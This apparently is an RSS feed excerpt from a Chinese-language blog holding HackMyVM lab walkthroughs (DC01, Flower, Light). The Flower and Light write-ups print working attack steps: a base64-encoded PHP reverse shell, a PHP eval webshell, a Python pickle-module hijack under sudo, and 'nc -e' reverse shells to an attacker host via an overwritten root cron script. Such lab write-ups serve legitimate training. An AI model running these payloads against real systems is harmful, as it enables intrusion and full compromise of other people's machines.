<br><img alt="20.DC01.004" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.004.png" referrerpolicy="no-referrer"><br>获取fileserver$ 用户在域控主机上的权限。<br> whoami /all
 USER INFORMATION
----------------

User Name               SID
======================= ============================================
soupedecode\fileserver$ S-1-5-21-2986980474-46765180-2505414164-2065


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                         Attributes
================================================== ================ =========================================== ===============================================================
SOUPEDECODE\Domain Computers                       Group            S-1-5-21-2986980474-46765180-2505414164-515 Mandatory group, Enabled by default, Enabled group
Everyone                                           Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Enterprise Admins                      Group            S-1-5-21-2986980474-46765180-2505414164-519 Mandatory group, Enabled by default, Enabled group
SOUPEDECODE\Denied RODC Password Replication Group Alias            S-1-5-21-2986980474-46765180-2505414164-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                 Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


USER CLAIMS INFORMATION
-----------------------
<br>可以发现该用是Administrators组的用户<br>那么我们就不需要提权了<br>直接读flag<br>\*Evil-WinRM\* PS C:\Users\FileServer$\Documents&gt; type C:\Users\ybob317\Desktop\user.txt
6bab1f09a7403980bfeb4c2b412be47b
\*Evil-WinRM\* PS C:\Users\FileServer$\Documents&gt; type C:\Users\administrator\desktop\root.txt
a9564ebc3289b7a14551baf8ad5ec60a
]]></description><link>https://www.c1trus.top/24-渗透/hmv/20.dc01.html</link><guid isPermaLink="false">24-渗透/HMV/20.DC01.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.Flower]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. webshell" data-href="#2. webshell" href="https://www.c1trus.top/about:blank#2._webshell" class="internal-link" target="_self" rel="noopener nofollow">2. webshell</a>
<br><a data-tooltip-position="top" aria-label="3. 写后门" data-href="#3. 写后门" href="https://www.c1trus.top/about:blank#3._写后门" class="internal-link" target="_self" rel="noopener nofollow">3. 写后门</a>
<br><a data-tooltip-position="top" aria-label="4. 提权" data-href="#4. 提权" href="https://www.c1trus.top/about:blank#4._提权" class="internal-link" target="_self" rel="noopener nofollow">4. 提权</a>
<br><br>nmap 扫描端口<br>Nmap scan report for 192.168.9.4
Host is up (0.00014s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:18:4F:12 (Oracle VirtualBox virtual NIC)
<br>访问网站查看<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png" referrerpolicy="no-referrer"><br>点击submit<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.002.png" referrerpolicy="no-referrer"><br>选择不同的花会显示出不同的数字<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.003.png" referrerpolicy="no-referrer"><br>既然这个数字在变，那我应该从数字入手。抓个包看看<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.004.png" referrerpolicy="no-referrer"><br>这个MSsy就是1+2=3<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.004.png" referrerpolicy="no-referrer"><br>说明这里存在Base64后的代码解析<br>先测试下<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.004.png" referrerpolicy="no-referrer"><br>直接反弹shell<br>c3lzdGVtKCdiYXNoIHwgbmMgMTkyLjE2OC45LjMgMTEyMicp
#system('bash | nc 192.168.9.3 1122')
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.004.png" referrerpolicy="no-referrer"><br>弹shell成功后但是不给回显 <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.005.png" referrerpolicy="no-referrer"><br>直接写文件<br>先看一下当前目录<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.006.png" referrerpolicy="no-referrer"><br>就在网站目录<br><br>system('echo "&lt;?php eval(\$\_POST[\"pass\"]);?&gt;" &gt; a.php');
c3lzdGVtKCdlY2hvICI8P3BocCBldmFsKFwkX1BPU1RbXCJwYXNzXCJdKTs/PiIgPiBhLnBocCcpOw==
<br>哥斯拉连接<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.007.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.008.png" referrerpolicy="no-referrer"><br><br>find / -perm -4000 2&gt;/dev/null
<br>尝试SUID 提权发现没有什么可以利用的<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.009.png" referrerpolicy="no-referrer"><br>这里面可以看到有sudo<br>我们看下当前用户可以用sudo执行什么文件<br>/tmp &gt;sudo -l

Matching Defaults entries for www-data on flower:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on flower:
    (rose) NOPASSWD: /usr/bin/python3 /home/rose/diary/diary.py
<br>看下这个文件<br>import pickle

diary = {"November28":"i found a blue viola","December1":"i lost my blue viola"}
p = open('diary.pickle','wb')
pickle.dump(diary,p)
<br>分析脚本可以发现这个脚本会引入pickle模块，然后执行代码<br>这里我们在同级目录新建一个pickle.py文件。这样就会引入我们的这个pickle.py 而不会引入模块库里面的pickle<br>新建一个pickle.py文件<br>将反弹命令写进这个文件里面 <br>import os;os.system("/bin/bash")
<br>然后执行diary.py<br>sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py
<br>sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py<br>system('nc -e /bin/sh 192.168.9.3 9999')
]]></description><link>https://www.c1trus.top/24-渗透/hmv/2.flower.html</link><guid isPermaLink="false">24-渗透/HMV/2.Flower.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/2.Flower.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[18.Light]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. 提权" data-href="#3. 提权" href="https://www.c1trus.top/about:blank#3._提权" class="internal-link" target="_self" rel="noopener nofollow">3. 提权</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=Light
<br>作者：sml
<br>难度：⭐️⭐️⭐️
<br>知识点：批量tcp连接、SUID替换
<br><br>nmap  192.168.56.10 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 14:14 CST
Nmap scan report for 192.168.56.10
Host is up (0.00040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
48383/tcp open  unknown
MAC Address: 08:00:27:C2:2E:36 (Oracle VirtualBox virtual NIC)
<br>发现端口一直在变<br>再次用nmap扫描一下，<br>nmap -sC -sV -p- 192.168.56.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 14:46 CST
Nmap scan report for 192.168.56.10
Host is up (0.00035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
|\_  256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
59355/tcp open  unknown
| fingerprint-strings:
|   GenericLines, NULL:
|     00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR
|     00000010: 0000 013f 0000 0085 0806 0000 002d 80ff ...?.........-..
|     00000020: 0c00 0000 0173 5247 4200 aece 1ce9 0000 .....sRGB.......
|     00000030: 0004 6741 4d41 0000 b18f 0bfc 6105 0000 ..gAMA......a...
|     00000040: 0009 7048 5973 0000 0ec3 0000 0ec3 01c7 ..pHYs..........
|     00000050: 6fa8 6400 0007 de49 4441 5478 5eed dbf7 o.d....IDATx^...
|     00000060: 9314 4518 c671 ffff 1f2d ab2c 73c0 9cb0 ..E..q...-.,s...
|     00000070: 0c08 7292 0491 2092 8380 08e2 09ca c1a1 ..r... .........
|     00000080: 2248 7aed c799 2ea7 a67a 6f7b c3ed edf2 "Hz......zo{....
|     00000090: 7c3f 5553 1c7d bdd3 d361 9f09 bbf7 5400 |?US.}...a....T.
|     000000a0: 8021 c20f 8025 c20f 8025 c20f 8025 c20f .!...%...%...%..
|     000000b0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f .%...%...%...%..
|     000000c0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f .%...%...%...%..
|\_    000000d0: 8025 c
<br>可以发现扫描出59355端口返回了一个图片的Hexdump<br>但是这个是不完整的<br>我们可以利用nc.traditional 批量连接端口 这样我们就能获取到完整的返回数据了<br>nc.traditional -nv 192.168.56.10 10000-60000
(UNKNOWN) [192.168.56.10] 21478 (?) open
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 013f 0000 0085 0806 0000 002d 80ff  ...?.........-..
00000020: 0c00 0000 0173 5247 4200 aece 1ce9 0000  .....sRGB.......
00000030: 0004 6741 4d41 0000 b18f 0bfc 6105 0000  ..gAMA......a...
00000040: 0009 7048 5973 0000 0ec3 0000 0ec3 01c7  ..pHYs..........
00000050: 6fa8 6400 0007 de49 4441 5478 5eed dbf7  o.d....IDATx^...
00000060: 9314 4518 c671 ffff 1f2d ab2c 73c0 9cb0  ..E..q...-.,s...
00000070: 0c08 7292 0491 2092 8380 08e2 09ca c1a1  ..r... .........
00000080: 2248 7aed c799 2ea7 a67a 6f7b c3ed edf2  "Hz......zo{....
00000090: 7c3f 5553 1c7d bdd3 d361 9f09 bbf7 5400  |?US.}...a....T.
000000a0: 8021 c20f 8025 c20f 8025 c20f 8025 c20f  .!...%...%...%..
000000b0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
000000c0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
000000d0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
000000e0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
000000f0: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000100: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000110: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000120: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000130: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000140: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000150: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000160: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000170: 8025 c20f 8025 c20f 8025 c20f 8025 c20f  .%...%...%...%..
00000180: 8025 c20f 8025 c20f 80a5 c50c bf07 0f23  .%...%.........#
00000190: eede 8fb8 d76e fa59 654f 82dc b7bf ff69  .....n.YeO.....i
000001a0: 0b30 538f 1fa7 f14f 63af 4d3f 976c d41c  .0S....Oc.M?.l..
000001b0: cda2 5da3 f5b7 98e1 77e4 c788 67b7 45bc  ..].....w...g.E.
000001c0: f855 c49b 5f47 bcba 33e2 f8e5 f697 0b4e  .U..\_G..3......N
000001d0: fd50 7f5e 586a 0b30 5337 ff8a 7869 47b3  .P.^Xj.0S7..xiG.
000001e0: e9e7 928d 9aa3 59b4 6bb4 fe16 ffb6 f78d  ......Y.k.......
000001f0: 3d11 efec 8b38 73b5 2d58 703f 2c47 bcbd  =....8s.-Xp?,G..
00000200: 37bd f952 b063 f6ee dc8b 782b 9d50 b5e9  7..R.c....x+.P..
00000210: e712 ad35 adb9 4d69 edcd d22c dad5 fadb  ...5..Mi...,....
00000220: 88be 6d80 c50f 3f4d d25a e1a7 4bf8 5da7  ..m...?M.Z..K.].
00000230: 2276 9ffe 7f3b d6bb 4abc f27b c49e 54be  "v...;..J..{..T.
00000240: e364 5b90 94ca 64dc fd5d 5d29 efaf 4b67  .d[...d..]])..Kg
00000250: dd2d 4722 bef8 3ee2 da6a 5b98 cce2 f826  .-G"..&gt;..j[....&amp;
00000260: d99f fc79 3762 e9f8 daf5 721b fbce ae5d  ...y7b....r....]
00000270: 4f4a ed6a fbf2 585b a155 7b7c 35f5 2ea7  OJ.j..X[.U{|5...
00000280: e3d3 fedf dfdf 6c1a 0b1d afea 76db cd21  ......l.....v..!
00000290: f4de 3711 7b3b 7d19 b75d a9e9 ef28 edd6  ..7.{;}..]...(..
000002a0: cc87 74db fdfa 4cb3 f63e 487d ef87 5f4d  ..t...L..&gt;H}..\_M
000002b0: 3f06 ada1 bfd2 4944 afd5 a69f e7c4 931d  ?.....ID........
000002c0: 7eab 779a 4079 6d57 73ab 7cf8 62c4 b6a3  ~.w.@ymWs.|.b...
000002d0: 119f 1c8e b874 bdad 949c baf2 ffed 7356  .....t........sV
000002e0: 2a1b 777f cbb7 9a45 a1b2 97d3 edd4 205f  \*.w....E...... \_
000002f0: a6c5 aa2b 8ea5 136d 416b bd8f 4f6a f7b7  ...+...mAk..Oj..
00000300: 35bd 393e 3e14 71f1 5a5b a9a5 aba4 6fce  5.9&gt;&gt;.q.Z[....o.
00000310: 451c bc30 bc5d f571 ade3 ebb7 ab7d e64d  E..0.].q.....}.M
00000320: 6ffa acb6 bfb5 f596 6f36 f3a4 70d1 a690  o.......o6..p...
00000330: 3e54 6837 87d0 bba9 ce34 daad ed6f 6dbb  &gt;Th7.....4...om.
00000340: 5233 1fa5 e353 602a f8bb e157 db8f fe1a  R3...S\*...W....
00000350: ba72 a379 eded bf23 5edf dd6c b706 3c4a  .r.y...#^..l..&lt;J
00000360: d800 4f76 f89d 4c93 a1db e2ee 44fe f04b  ..Ov..L.....D..K
00000370: 7b5b d909 a1bc a8ba f54a 65a3 ee4f 0b41  {[.......Je..O.A
00000380: be4a 67c2 8f0f 467c f65d 7356 2d79 f828  .Jg...F|.]sV-y.(
00000390: 627b 5a78 1f7e 9bce c09d 052f eb75 7ce3  b{Zx.~...../.u|.
000003a0: ec4f a1b7 f940 1360 6ba9 6db7 54af d46e  .O...@.k.m.T..n
000003b0: 496d 7f6b eb89 ae4c f26d efa0 ab94 49fa  Im.k...L.m....I.
000003c0: 3149 7f6b db2d 19e5 f86a d641 697f fde3  1I.k.-...j.Ai...
000003d0: fb34 adf7 9329 34bb 8f12 1486 73e2 c90e  .4...)4.....s...
000003e0: bfd2 6299 76d9 f95f 07d7 fbe8 40c4 335b  ..b.v..\_....@.3[
000003f0: 23fe 4867 be61 f480 f9ad b498 ce2f b705  #.Hg.a......./..
00000400: 1dd3 3ee6 49ca 6aad 352e c3ca 8eff d45c  ..&gt;.I.j.5......\
00000410: 650c 6bb7 f4da da76 4bf5 446f ce61 6fd4  e.k....vK.Do.ao.
00000420: da7e d4b6 3b49 7f4b 6525 93cc c7b8 655f  .~..;I.Ke%....e\_
00000430: a4ab c333 3f13 7eeb 4603 ad01 d7c0 f74d  ...3?.~.F......M
00000440: 7322 2597 e9ea 4c13 996f e114 5add 0f28  s"%...L..o..Z..(
00000450: 723d 9d2d 6ba9 1d6d 27d2 99b2 6f1a c73c  r=.-k..m'...o..&lt;
00000460: adb2 4174 95a4 f1c8 9b6e cd34 4ee3 b6a1  ..At.....n.4N...
00000470: 4f5a 5f49 b74f dd71 d615 7457 7e6d ed7c  OZ\_I.O.q..tW~m.|
00000480: 0cab 27eb 117e 35ed 8ed2 df9a f19b e67c  ..'..~5........|
00000490: 8c5b 46f8 ad33 0db4 065c 03df 573b 69f9  .[F..3...\..W;i.
000004a0: 5945 b7ec 5c7b 59af 0599 e5d7 aa7c e5cf  YE..\{Y......|..
000004b0: e619 d1af b79a edea 4a5b 2929 b531 8816  ........J[)).1..
000004c0: a91e 34ab 7d9d 9db5 50fa 6afb 318b b292  ..4.}...P.j.1...
000004d0: 9f6f a437 ea89 a69e c6e5 b7db 1107 cf37  .o.7...........7
000004e0: cfcd c66d 43df 37d3 986a 8cb5 bf03 697f  ...mC.7..j....i.
000004f0: ba92 de7d aaad 90e4 d7d6 cec7 b07a b21e  ...}.........z..
00000500: e157 d3ee 28fd 1dd6 eeb4 e7a3 b6ac ff3e  .W..(..........&gt;
00000510: fafc 48aa 97c2 efde 8366 3c79 e637 651a  ..H......f&lt;y.7e.
00000520: 684d 8226 a3ef 741a 782d bcd2 a469 22b2  hM.&amp;..t.x-...i".
00000530: 6b69 31ea e1f6 a654 a605 a84f fdf6 a640  ki1....T...O...@
00000540: da7c b079 e09d 95f6 5752 5a18 83e8 0da6  .|.y....WRZ.....
00000550: 7675 9538 e8f6 b8b6 1fd3 a8d7 2d2b d5d3  vu.8........-+..
00000560: e2bd 9042 fa6c 3a39 647a 2654 3a79 f4f7  ...B.l:9dz&amp;T:y..
00000570: 576a a376 acf2 c9a8 fb81 51ed 7cd4 d693  Wj.v......Q.|...
00000580: 5b69 3e34 177a b3ea 417d 496d 3f46 69b7  [i&gt;4.z..A}Im?Fi.
00000590: afd4 dfda 766b e763 9275 90eb 95de 471a  ....vk.c.u....G.
000005a0: bf5f 5288 1f4d b7f3 6753 bdd3 69d3 f1e8  .\_R..M..gS..i...
000005b0: c392 3bf3 f3e5 e9c5 0cbf ffbe 85de 0ea2  ..;.............
000005c0: 0655 97f4 ba5d d487 06dd 6fa6 eb3b 4b0a  .U...]....o..;K.
000005d0: b07c fba9 dfab 9ece 80ba 05e8 d2a4 e843  .|.............C
000005e0: 092d 7a4d b43e 98d8 77ae fd65 abbf bffc  .-zM.&gt;..w..e....
000005f0: d725 fab7 abb4 804a 1e3d 8eb8 beda f441  .%.....J.=.....A
00000600: 6daf 0e78 b3d5 f663 d27a 1ac7 ee31 97ea  m..x...c.z...1..
00000610: 1dbd d4fc 5f63 94d5 eeaf f6cd 9be7 37ff  ....\_c........7.
00000620: 054f 6d3f 06cd 476d 3dd1 1c68 2e34 27d7  .Om?..Gm=..h.4'.
00000630: d315 d3fd 74d5 a27a dd75 55db 8fda 766b  ....t..z.uU...vk
00000640: fb3b 6ebb a3cc ef28 f54a efa3 fc81 913e  .;n....(.J.....&gt;
00000650: f155 5f14 ba7a 5d77 7f73 6231 c34f 6790  .U\_..z]w.sb1.Og.
00000660: fc17 1e1a 586d 1a6c fdff e92d 6da5 9626  ....Xm.l...-m..&amp;
00000670: 43cf 57f4 3b6d fa74 4acf 2206 797e a9b9  C.W.;m.tJ.".y~..
00000680: d5d5 d9ae a4bf bfe7 b637 0ba3 4b0f b0b5  .........7..K...
00000690: 0fed 6b2d fafa 80ce 9c35 0ba3 dbae ae14  ..k-.....5......
000006a0: 153e 3b3a b744 596d 7ffb f534 7e1a c7fe  .&gt;;:.DYm...4~...
000006b0: 314f 737f a571 2995 75e7 77d4 764b f321  1Os..q).u.w.vK.!
000006c0: b5f5 321d 8fae ba72 fdee baaa ed87 d4b4  ..2....r........
000006d0: 5bdb df49 daad 9ddf 49d7 c14a ba33 503d  [..I....I..J.3P=
000006e0: 6d7f dc6d 6e85 4bc7 3707 16ff b677 91e9  m..mn.K.7....w..
000006f0: eca9 f0d3 4219 c5ce 147a ba32 292d 3e00  ....B....z.2)-&gt;.
00000700: 5508 bf8d a46f e1eb 01b7 9e33 d6d2 37eb  U....o.....3..7.
00000710: f525 d4fd e996 7c8e 1e1e 038b 86f0 9b77  .%....|........w
00000720: fae4 4e9f 025f b8d6 7c63 5eb7 10fa d6bf  ..N..\_..|c^.....
00000730: 9e15 0218 1be1 37ef f477 927a a8ac bfaa  ......7..w.z....
00000740: d0a6 af3f ccd1 2766 c0a2 22fc 0058 22fc  ...?..'f.."..X".
00000750: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000760: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000770: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000780: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000790: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007a0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007b0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007c0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007d0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007e0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
000007f0: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000800: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000810: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000820: 0058 22fc 0058 22fc 0058 22fc 0058 22fc  .X"..X"..X"..X".
00000830: 0018 8af8 1765 703a 66dc e967 bc00 0000  .....ep:f..g....
00000840: 0049 454e 44ae 4260 82                   .IEND.B.
<br>然后将其保存下来<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.001.png" referrerpolicy="no-referrer"><br>获取到了账户密码<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.002.png" referrerpolicy="no-referrer"><br><br>iloveopenedports
<br>连接上去，密码提示我们可以获取shadow<br>可能是进行爆破<br>但是shadow是没有权限读取的，也就无法爆破了<br>lover@light:~$ ls -la
total 52
drwxr-xr-x 3 lover lover 4096 Nov 18 01:51 .
drwxr-xr-x 3 root  root  4096 Nov 13  2020 ..
-rw-r--r-- 1 lover lover  220 Nov 13  2020 .bash\_logout
-rw-r--r-- 1 lover lover 3526 Nov 13  2020 .bashrc
-rwxr-xr-x 1 lover lover 1921 Nov 13  2020 flag.sh
drwxr-xr-x 3 lover lover 4096 Nov 13  2020 .local
-rw-r--r-- 1 lover lover 9037 Nov 13  2020 mypass.txt
-rw-r--r-- 1 lover lover  807 Nov 13  2020 .profile
-rwxr-xr-x 1 lover lover  660 Nov 13  2020 tip.py
-rw------- 1 lover lover   17 Nov 13  2020 user.txt
-rw------- 1 lover lover   51 Nov 18 01:51 .Xauthority
<br>tip.py<br> cat tip.py
#!/usr/bin/env python3
import socket
from random import randint

HOST = '0.0.0.0'                 # Symbolic name meaning all available interfaces
while True:
        allow\_reuse\_address = True
        random = randint(8000,65000)
        PORT = random              # Arbitrary non-privileged port
        s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
        s.setsockopt(socket.SOL\_SOCKET, socket.SO\_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen(1)
        conn, addr = s.accept()
        print ("Connected by",addr)
        with open('mypass.txt', 'r') as f:
                conn.sendall(f.read().encode('utf-8'))
        conn.close()
<br>mypassword.txt就是图片的hexdump<br>提权检测<br>sudo -l
Matching Defaults entries for lover on light:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lover may run the following commands on light:
    (ALL : ALL) NOPASSWD: /usr/bin/2to3-2.7
<br>看下命令的参数<br>2to3-2.7 --help
Usage: 2to3 [options] file|dir ...

Options:
  -h, --help            show this help message and exit
  -d, --doctests\_only   Fix up doctests only
  -f FIX, --fix=FIX     Each FIX specifies a transformation; default: all
  -j PROCESSES, --processes=PROCESSES
                        Run 2to3 concurrently
  -x NOFIX, --nofix=NOFIX
                        Prevent a transformation from being run
  -l, --list-fixes      List available transformations
  -p, --print-function  Modify the grammar so that print() is a function
  -v, --verbose         More verbose logging
  --no-diffs            Don't show diffs of the refactoring
  -w, --write           Write back modified files
  -n, --nobackups       Don't write backups for modified files
  -o OUTPUT\_DIR, --output-dir=OUTPUT\_DIR
                        Put output files in this directory instead of
                        overwriting the input files.  Requires -n.
  -W, --write-unchanged-files
                        Also write files even if no changes were required
                        (useful with --output-dir); implies -w.
  --add-suffix=ADD\_SUFFIX
                        Append this string to all output filenames. Requires
                        -n if non-empty.  ex: --add-suffix='3' will generate
                        .py3 files.
<br>这里他会不断执行这个py脚本，肯定是有一个个进程在操作的<br>我们上传一个pspy64监听进程。找出这个进程<br>这里耐心等待一下<br>./pspy64 |grep UID=0
2024/11/18 02:12:01 CMD: UID=0    PID=8489   | /usr/sbin/CRON -f
2024/11/18 02:12:01 CMD: UID=0    PID=8490   | /usr/sbin/CRON -f
2024/11/18 02:12:01 CMD: UID=0    PID=8491   | /bin/sh -c python /root/script/light.py
<br>可以看到他定时会执行这个light.py脚本<br>我们利用2to3-2.7命令替换这个脚本<br>反弹shell<br>新建一个脚本light.py<br>import os
os.system('nc -e /bin/bash 192.168.56.6 1122')
<br>利用-W参数 与-o参数实现替换<br>sudo 2to3-2.7 -Wn light.py -o /root/script/
<br>开启监听 返回rootshell<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/18.Light.003.png" referrerpolicy="no-referrer"><br>sh flag.sh

                                   .     \*\*
                                \*           \*.
                                              ,\*
                                                 \*,
                         ,                         ,\*
                      .,                              \*,
                    /                                    \*
                 ,\*                                        \*,
               /.                                            .\*.
             \*                                                  \*\*
             ,\*                                               ,\*
                \*\*                                          \*.
                   \*\*                                    \*\*.
                     ,\*                                \*\*
                        \*,                          ,\*
                           \*                      \*\*
